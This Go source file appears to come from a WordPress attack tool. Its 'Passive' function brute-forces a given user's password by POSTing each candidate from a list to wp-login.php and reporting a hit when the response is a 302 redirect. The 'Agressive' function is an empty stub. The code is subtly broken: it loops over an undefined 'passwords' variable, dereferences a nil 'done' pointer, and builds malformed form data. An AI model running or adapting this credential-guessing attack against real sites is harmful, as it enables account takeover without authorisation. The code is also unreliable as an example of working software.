package fuzzing

import (
	"net/http"

	"github.com/institute-atri/ghttp"
	"github.com/institute-atri/glogger"
)

func Passive(url, username string, password []string) {
	glogger.Info("Doing brute force attack...")

	request := ghttp.NewHttp()

	err := request.SetURL(url + "wp-login.php")
	glogger.ErrorHandling(err)

	err = request.SetMethod("POST")
	glogger.ErrorHandling(err)

	request.SetContentType("application/x-www-form-urlencoded")

	var done *bool

	for _, password := range passwords {
		request.SetData("log=" + username + "&pwd=" + password + "&wp-submit=Acessar&redirect_to=" + url + "testcookie=1")

		request.SetRedirectFunc(func(req *http.Request, via []*http.Request) error {
			if req.Response.StatusCode == 302 {
				glogger.Done("login:\n username:" + username + "\n password:" + password)
				*done = true
			}

			return nil
		})

		_, err := request.Do()
		glogger.ErrorHandling(err)
	}

	if !*done {
		glogger.Danger("User password not found!")
	}
}

func Agressive(url, username string, passwords []string) {}
